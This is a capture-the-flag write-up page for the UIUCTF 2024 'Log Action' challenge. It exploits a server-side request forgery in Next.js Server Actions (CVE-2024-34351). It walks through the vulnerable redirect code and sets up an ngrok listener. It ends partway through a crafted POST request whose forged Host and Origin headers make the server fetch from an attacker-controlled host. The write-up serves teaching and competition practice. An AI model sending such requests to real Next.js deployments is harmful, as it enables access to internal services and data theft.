@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="google-site-verification" content="BbTeZdPwpo3YGbnXDUp7L8Pol41hi_38AAjNkplpLJA" />
+    <meta property="og:image" content="https://siunam321.github.io/assets/images/ogimage.png" />
+    <!-- <meta property="og:image:width" content="1200" /> -->
+    <!-- <meta property="og:image:height" content="630" /> -->
+    <meta property="og:description" content="Welcome to my website! In here, you will find things about Capture The Flag (CTF) writeups, blogs and more!" />
+    <meta name="description" content="Welcome to my website! In here, you will find things about Capture The Flag (CTF) writeups, blogs and more!">
+    <link rel="stylesheet" href="/assets/css/style.css?v=a7dbbbddbc77d8cea40bd2e04939234cfb9b9657">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']]
+      }
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/latest.js?config=TeX-MML-AM_CHTML" type="text/javascript"></script>
+
+<!-- end custom head snippets -->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Log Action | Siunam’s Website</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Log Action" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My personal website" />
+<meta property="og:description" content="My personal website" />
+<link rel="canonical" href="https://siunam321.github.io/ctf/UIUCTF-2024/Web/Log-Action/" />
+<meta property="og:url" content="https://siunam321.github.io/ctf/UIUCTF-2024/Web/Log-Action/" />
+<meta property="og:site_name" content="Siunam’s Website" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Log Action" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"My personal website","headline":"Log Action","url":"https://siunam321.github.io/ctf/UIUCTF-2024/Web/Log-Action/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Siunam's Website</h1>
+        </a>
+        <p class="site_description">My personal website</p>
+
+        <section id="downloads">
+          <a href="https://siunam321.github.io/" class="btn btn-github">Home</a>
+          <a href="https://siunam321.github.io/about" class="btn btn-github">About</a>
+          <a href="https://siunam321.github.io/blog" class="btn btn-github">Blog</a>
+          <a href="https://siunam321.github.io/ctf" class="btn btn-github">Writeups</a>
+          <a href="https://siunam321.github.io/projects" class="btn btn-github">Projects</a>
+          <a href="https://siunam321atcyberse.wixsite.com/tangcheukhei" target="_blank" class="btn btn-github">E-Portfolio</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="log-action">Log Action</h1>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+
+<ol>
+  <li><a href="#overview">Overview</a></li>
+  <li><a href="#background">Background</a></li>
+  <li><a href="#enumeration">Enumeration</a></li>
+  <li><a href="#exploitation">Exploitation</a></li>
+  <li><a href="#conclusion">Conclusion</a></li>
+</ol>
+
+<h2 id="overview">Overview</h2>
+
+<ul>
+  <li>Solved by: @siunam</li>
+  <li>105 solves / 431 points</li>
+  <li>Author: @Minh</li>
+  <li>Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆</li>
+</ul>
+
+<h2 id="background">Background</h2>
+
+<p>I keep trying to log in, but it’s not working :’(</p>
+
+<p><a href="http://log-action.challenge.uiuc.tf/">http://log-action.challenge.uiuc.tf/</a></p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701133334.png" alt="" /></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p><strong>Index page:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701133354.png" alt="" /></p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701133404.png" alt="" /></p>
+
+<p>In here, we can see that it has login page.</p>
+
+<p>We can try to login as a random user just for testing purpose:</p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701133450.png" alt="" /></p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701133459.png" alt="" /></p>
+
+<p>According to the challenge’s description, this login page appears to be broken.</p>
+
+<p>There’s not much we can do in here. Let’s read this web application’s source code!</p>
+
+<p><strong>In this challenge, we can download a <a href="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/Web/Log-Action/log-action.zip">file</a>:</strong></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|12:29:43<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; file log-action.zip     
+log-action.zip: Zip archive data, at least v2.0 to extract, compression <span class="nv">method</span><span class="o">=</span>store
+┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|12:29:45<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; unzip log-action.zip 
+Archive:  log-action.zip
+   creating: log-action/
+   creating: log-action/backend/
+  inflating: log-action/backend/flag.txt  
+  inflating: log-action/docker-compose.yml  
+   creating: log-action/frontend/
+  inflating: log-action/frontend/.gitignore  
+  inflating: log-action/frontend/Dockerfile  
+  inflating: log-action/frontend/entrypoint.sh  
+  inflating: log-action/frontend/next-env.d.ts  
+  inflating: log-action/frontend/next.config.mjs  
+  inflating: log-action/frontend/package-lock.json  
+  inflating: log-action/frontend/package.json  
+  inflating: log-action/frontend/postcss.config.mjs  
+   creating: log-action/frontend/src/
+   creating: log-action/frontend/src/app/
+   creating: log-action/frontend/src/app/admin/
+  inflating: log-action/frontend/src/app/admin/page.tsx  
+  inflating: log-action/frontend/src/app/global.css  
+  inflating: log-action/frontend/src/app/layout.tsx  
+   creating: log-action/frontend/src/app/login/
+  inflating: log-action/frontend/src/app/login/page.tsx  
+   creating: log-action/frontend/src/app/logout/
+  inflating: log-action/frontend/src/app/logout/page.tsx  
+  inflating: log-action/frontend/src/app/page.tsx  
+  inflating: log-action/frontend/src/auth.config.ts  
+  inflating: log-action/frontend/src/auth.ts  
+   creating: log-action/frontend/src/lib/
+  inflating: log-action/frontend/src/lib/actions.ts  
+  inflating: log-action/frontend/src/middleware.ts  
+  inflating: log-action/frontend/tailwind.config.ts  
+  inflating: log-action/frontend/tsconfig.json  
+</code></pre></div></div>
+
+<p>After reviewing the source, we can have the following findings!</p>
+
+<ul>
+  <li>The application separates the front-end and the back-end</li>
+  <li>The front-end uses <strong>Next.js</strong> and Tailwind CSS, the back-end uses Nginx</li>
+  <li>The web application’s main logic is at the front-end</li>
+</ul>
+
+<p>First of, where’s the flag, our objective?</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">log-action/docker-compose.yml</code>, we can see that the flag file (<code class="language-plaintext highlighter-rouge">flag.txt</code>) is at the <strong>back-end service</strong> and <strong>mounted the flag file from <code class="language-plaintext highlighter-rouge">./backend/flag.txt</code> to <code class="language-plaintext highlighter-rouge">/usr/share/nginx/html/flag.txt</code></strong>. That being said, if we can <em>somehow</em> reach to the internal Nginx, we could <strong>get the flag at <code class="language-plaintext highlighter-rouge">http://&lt;back-end_IP&gt;/flag.txt</code></strong>. This is because the <strong>default Nginx webroot directory is at <code class="language-plaintext highlighter-rouge">/usr/share/nginx/html/</code></strong>.</p>
+
+<p>Ok, now we know what’s our objective: <em>Somehow reach to the internal Nginx</em>. Hmm… <strong>SSRF (Server-Side Request Forgery)</strong>? where attackers can send HTTP requests to an internal network/service.</p>
+
+<p>Huh, is there any SSRF vulnerability in this web application?</p>
+
+<p>Well, after reading the <strong>authentication</strong> implementation, <strong>it has nothing to do with SSRF</strong>. Even if we logged in as the admin user, it just render a page like this:</p>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">Link</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">next/link</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="k">export</span> <span class="k">default</span> <span class="kd">function</span> <span class="nx">Page</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="p">(</span>
+    <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="nx">h1</span> <span class="nx">className</span><span class="o">=</span><span class="dl">"</span><span class="s2">text-2xl font-bold</span><span class="dl">"</span><span class="o">&gt;</span>
+        <span class="nx">Admin</span>
+      <span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">Very</span> <span class="nx">cool</span><span class="o">!</span> <span class="nx">You</span> <span class="nx">logged</span> <span class="k">in</span> <span class="k">as</span> <span class="nx">admin</span><span class="o">!&lt;</span><span class="sr">/p</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">Link</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/logout</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Log</span> <span class="nx">out</span><span class="o">&lt;</span><span class="sr">/Link</span><span class="err">&gt;
+</span>    <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
+</span>  <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So, nope. Well, at least not in the web application’s implementation.</p>
+
+<p>Another thing I’ll look for is <strong>dependencies issue</strong>. A year ago, I learned about the Log4J RCE (Remote Code Execution) vulnerability, and it made me realize all the libraries and modules that we all use could be potentially dangerous.</p>
+
+<p>In JavaScript, the most popular <a href="https://en.wikipedia.org/wiki/Package_manager">package manager</a> is <a href="https://www.npmjs.com/">npm</a>. In the <code class="language-plaintext highlighter-rouge">npm</code> command-line tool, <strong>we can use the <code class="language-plaintext highlighter-rouge">npm audit</code> command to check for dependencies issue</strong>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|12:57:30<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; <span class="nb">cd </span>log-action/frontend 
+┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action/log-action/frontend<span class="o">)</span>-[2024.07.01|12:57:32<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; npm audit
+<span class="c"># npm audit report</span>
+
+next  <span class="o">&gt;=</span>13.4.0 &lt;14.1.1
+Severity: high
+Next.js Server-Side Request Forgery <span class="k">in </span>Server Actions - https://github.com/advisories/GHSA-fr5h-rqp8-mj6g
+fix available via <span class="sb">`</span>npm audit fix <span class="nt">--force</span><span class="sb">`</span>
+Will <span class="nb">install </span>next@14.2.4, which is outside the stated dependency range
+node_modules/next
+
+1 high severity vulnerability
+
+To address all issues, run:
+  npm audit fix <span class="nt">--force</span>
+</code></pre></div></div>
+
+<p>Ah ha! Looks like <strong>this version of Next.js (<code class="language-plaintext highlighter-rouge">13.4.0</code>) has a SSRF vulnerability in the Server Actions</strong>!</p>
+
+<p>In that <a href="https://github.com/advisories/GHSA-fr5h-rqp8-mj6g">GitHub Advisory link</a>, it has a CVE number: <code class="language-plaintext highlighter-rouge">CVE-2024-34351</code>.</p>
+
+<p>After Googling this CVE number, we can find <a href="https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps">this Assetnote blog post</a>, it’s written by the researchers who found this SSRF vulnerability.</p>
+
+<p>In short, although <strong>Next.js</strong> seems like a client-side framework, it also supports server-side framework using the <strong>Server Action</strong>.</p>
+
+<p>You may ask: What’s Server Action in Next.js?</p>
+
+<p>Well, Next.js’s Server Action <strong>allows JavaScript code to be executed asynchronously on the server-side</strong>. By doing so, the developers don’t have to develop another back-end code to process server-side logic.</p>
+
+<p>According to the Assetnote’s blog post, when we call a Server Action AND it responds with a <strong>redirect</strong>, it calls asynchronous function <code class="language-plaintext highlighter-rouge">createRedirectRenderResult</code>.</p>
+
+<p><strong>If we look at this web application source code, the logout page (<code class="language-plaintext highlighter-rouge">log-action/frontend/src/app/logout/page.tsx</code>) does satisfy the above condition:</strong></p>
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">Link</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">next/link</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span> <span class="nx">redirect</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">next/navigation</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span> <span class="nx">signOut</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@/auth</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="k">export</span> <span class="k">default</span> <span class="kd">function</span> <span class="nx">Page</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="p">(</span>
+    <span class="o">&lt;&gt;</span>
+      <span class="o">&lt;</span><span class="nx">h1</span> <span class="nx">className</span><span class="o">=</span><span class="dl">"</span><span class="s2">text-2xl font-bold</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Log</span> <span class="nx">out</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">Are</span> <span class="nx">you</span> <span class="nx">sure</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">log</span> <span class="nx">out</span><span class="p">?</span><span class="o">&lt;</span><span class="sr">/p</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">Link</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/admin</span><span class="dl">"</span><span class="o">&gt;</span>
+        <span class="nx">Go</span> <span class="nx">back</span>
+      <span class="o">&lt;</span><span class="sr">/Link</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">form</span>
+        <span class="nx">action</span><span class="o">=</span><span class="p">{</span><span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">use server</span><span class="dl">"</span><span class="p">;</span>
+          <span class="k">await</span> <span class="nx">signOut</span><span class="p">({</span> <span class="na">redirect</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
+          <span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}}</span>
+      <span class="o">&gt;</span>
+        <span class="o">&lt;</span><span class="nx">button</span> <span class="kd">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Log</span> <span class="nx">out</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
+</span>    <span class="o">&lt;</span><span class="sr">/</span><span class="err">&gt;
+</span>  <span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As you can see, the logout page uses Server Action (<code class="language-plaintext highlighter-rouge">"use server";</code>) and <code class="language-plaintext highlighter-rouge">redirect</code> function to redirect the client to <code class="language-plaintext highlighter-rouge">/login</code>.</p>
+
+<p><strong>Logout page:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701133933.png" alt="" /></p>
+
+<p>When we clicked the “Log out” button, it sends the following POST request to <code class="language-plaintext highlighter-rouge">/logout</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701134059.png" alt="" /></p>
+
+<p>Now, since Next.js is an open-source project, we can take a look at function <code class="language-plaintext highlighter-rouge">createRedirectRenderResult</code> before they applied the vulnerability patch: <a href="https://github.com/vercel/next.js/blob/64b718c6618b6c419872abbf22163ae543ac259e/packages/next/src/server/app-render/action-handler.ts#L240-L327">https://github.com/vercel/next.js/blob/64b718c6618b6c419872abbf22163ae543ac259e/packages/next/src/server/app-render/action-handler.ts#L240-L327</a></p>
+
+<p>If we look closer at this function, something’s really stands out:</p>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">createRedirectRenderResult</span><span class="p">(</span>
+  <span class="nx">req</span><span class="p">:</span> <span class="nx">BaseNextRequest</span><span class="p">,</span>
+  <span class="nx">res</span><span class="p">:</span> <span class="nx">BaseNextResponse</span><span class="p">,</span>
+  <span class="nx">originalHost</span><span class="p">:</span> <span class="nx">Host</span><span class="p">,</span>
+  <span class="nx">redirectUrl</span><span class="p">:</span> <span class="kr">string</span><span class="p">,</span>
+  <span class="nx">basePath</span><span class="p">:</span> <span class="kr">string</span><span class="p">,</span>
+  <span class="nx">staticGenerationStore</span><span class="p">:</span> <span class="nx">StaticGenerationStore</span>
+<span class="p">)</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">x-action-redirect</span><span class="dl">'</span><span class="p">,</span> <span class="nx">redirectUrl</span><span class="p">)</span>
+  <span class="p">[...]</span>
+  <span class="c1">// If we're redirecting to another route of this Next.js application, we'll</span>
+  <span class="c1">// try to stream the response from the other worker path. When that works,</span>
+  <span class="c1">// we can save an extra roundtrip and avoid a full page reload.</span>
+  <span class="c1">// When the redirect URL starts with a `/`, or to the same host as application,</span>
+  <span class="c1">// we treat it as an app-relative redirect.</span>
+  <span class="kd">const</span> <span class="nx">parsedRedirectUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">redirectUrl</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://n</span><span class="dl">'</span><span class="p">)</span>
+  <span class="kd">const</span> <span class="nx">isAppRelativeRedirect</span> <span class="o">=</span>
+    <span class="nx">redirectUrl</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span>
+    <span class="p">(</span><span class="nx">originalHost</span> <span class="o">&amp;&amp;</span> <span class="nx">originalHost</span><span class="p">.</span><span class="nx">value</span> <span class="o">===</span> <span class="nx">parsedRedirectUrl</span><span class="p">.</span><span class="nx">host</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">isAppRelativeRedirect</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+    <span class="kd">const</span> <span class="nx">forwardedHeaders</span> <span class="o">=</span> <span class="nx">getForwardedHeaders</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span>
+    <span class="nx">forwardedHeaders</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">RSC_HEADER</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">)</span>
+    
+    <span class="kd">const</span> <span class="nx">proto</span> <span class="o">=</span>
+      <span class="nx">staticGenerationStore</span><span class="p">.</span><span class="nx">incrementalCache</span><span class="p">?.</span><span class="nx">requestProtocol</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">https</span><span class="dl">'</span>
+
+    <span class="c1">// For standalone or the serverful mode, use the internal origin directly</span>
+    <span class="c1">// other than the host headers from the request.</span>
+    <span class="kd">const</span> <span class="nx">origin</span> <span class="o">=</span>
+      <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">__NEXT_PRIVATE_ORIGIN</span> <span class="o">||</span> <span class="s2">`</span><span class="p">${</span><span class="nx">proto</span><span class="p">}</span><span class="s2">://</span><span class="p">${</span><span class="nx">originalHost</span><span class="p">.</span><span class="nx">value</span><span class="p">}</span><span class="s2">`</span>
+
+    <span class="kd">const</span> <span class="nx">fetchUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span>
+      <span class="s2">`</span><span class="p">${</span><span class="nx">origin</span><span class="p">}${</span><span class="nx">basePath</span><span class="p">}${</span><span class="nx">parsedRedirectUrl</span><span class="p">.</span><span class="nx">pathname</span><span class="p">}${</span><span class="nx">parsedRedirectUrl</span><span class="p">.</span><span class="nx">search</span><span class="p">}</span><span class="s2">`</span>
+    <span class="p">)</span>
+    <span class="p">[...]</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">fetchUrl</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="nx">forwardedHeaders</span><span class="p">,</span>
+        <span class="na">next</span><span class="p">:</span> <span class="p">{</span>
+          <span class="c1">// @ts-ignore</span>
+          <span class="na">internal</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="p">},</span>
+      <span class="p">})</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">content-type</span><span class="dl">'</span><span class="p">)</span> <span class="o">===</span> <span class="nx">RSC_CONTENT_TYPE_HEADER</span><span class="p">)</span> <span class="p">{</span>
+        <span class="p">[...]</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nx">FlightRenderResult</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">body</span><span class="o">!</span><span class="p">)</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="p">[...]</span>
+      <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+      <span class="p">[...]</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="nx">RenderResult</span><span class="p">.</span><span class="nx">fromStatic</span><span class="p">(</span><span class="dl">'</span><span class="s1">{}</span><span class="dl">'</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As you can see in the comment, instead of redirect directly to the client, if the redirect path starts with <code class="language-plaintext highlighter-rouge">/</code>, it first <strong>fetches the response of the redirect path</strong>, then return the response to the client. By doing so, it improves the performance (“we can save an extra roundtrip and avoid a full page reload.”).</p>
+
+<p>Hmm… <strong>I wonder if we can control the <code class="language-plaintext highlighter-rouge">origin</code></strong>… If so, we can let the server-side to <strong>fetch any resources from any origins</strong>.</p>
+
+<p><strong>By tracing to the function call, that function was called by <a href="https://github.com/vercel/next.js/blob/64b718c6618b6c419872abbf22163ae543ac259e/packages/next/src/server/app-render/action-handler.ts#L367">function <code class="language-plaintext highlighter-rouge">handleAction</code></a>:</strong></p>
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="k">async</span> <span class="kd">function</span> <span class="nx">handleAction</span><span class="p">([...]):</span>
+  <span class="p">[...]</span>
+  <span class="kd">const</span> <span class="nx">originDomain</span> <span class="o">=</span>
+    <span class="k">typeof</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">origin</span><span class="dl">'</span><span class="p">]</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span>
+      <span class="p">?</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">origin</span><span class="dl">'</span><span class="p">]).</span><span class="nx">host</span>
+      <span class="p">:</span> <span class="kc">undefined</span>
+  <span class="p">[...]</span>
+  <span class="kd">const</span> <span class="nx">hostHeader</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">host</span><span class="dl">'</span><span class="p">]</span>
+  <span class="p">[...]</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">originDomain</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">host</span> <span class="o">||</span> <span class="nx">originDomain</span> <span class="o">!==</span> <span class="nx">host</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+  <span class="p">}</span>
+  <span class="p">[...]</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">actionId</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">forwardedWorker</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="p">{</span>
+        <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">done</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">result</span><span class="p">:</span> <span class="k">await</span> <span class="nx">createForwardedActionResponse</span><span class="p">(</span>
+          <span class="nx">req</span><span class="p">,</span>
+          <span class="nx">res</span><span class="p">,</span>
+          <span class="nx">host</span><span class="p">,</span>
+          <span class="nx">forwardedWorker</span><span class="p">,</span>
+          <span class="nx">ctx</span><span class="p">.</span><span class="nx">renderOpts</span><span class="p">.</span><span class="nx">basePath</span><span class="p">,</span>
+          <span class="nx">staticGenerationStore</span>
+        <span class="p">),</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="p">[...]</span>
+</code></pre></div></div>
+
+<p>Hmm… We can control it by using the <strong><code class="language-plaintext highlighter-rouge">Host</code> header</strong>.</p>
+
+<blockquote>
+  <p>Note: It seems like it also needs the <code class="language-plaintext highlighter-rouge">Origin</code> header to check for CSRF attacks.</p>
+</blockquote>
+
+<p>Nice! With that said, we can let the server-side to fetch any resources from any origins with the <code class="language-plaintext highlighter-rouge">Host</code> header!</p>
+
+<p>To test it, we need to:</p>
+
+<ul>
+  <li>Port forwarding via ngrok:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|14:38:59<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; ngrok http 80
+<span class="o">[</span>...]
+Forwarding                    https://1593-<span class="o">{</span>REDACTED<span class="o">}</span>.ngrok-free.app -&gt; http://localhost:80            
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<ul>
+  <li>Setup a simple HTTP server:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|14:40:17<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<p><strong>Then, send the following POST request to <code class="language-plaintext highlighter-rouge">/logout</code>:</strong></p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/logout</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">1593-{REDACTED}.ngrok-free.app</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://1593-{REDACTED}.ngrok-free.app/</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/x-component</span>
+<span class="na">Next-Action</span><span class="p">:</span> <span class="s">c3a144622dd5b5046f1ccb6007fea3f3710057de</span>
+<span class="na">Next-Router-State-Tree</span><span class="p">:</span> <span class="s">%5B%22%22%2C%7B%22children%22%3A%5B%22logout%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------30523002528298602961754182131</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">333</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://log-action.challenge.uiuc.tf</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
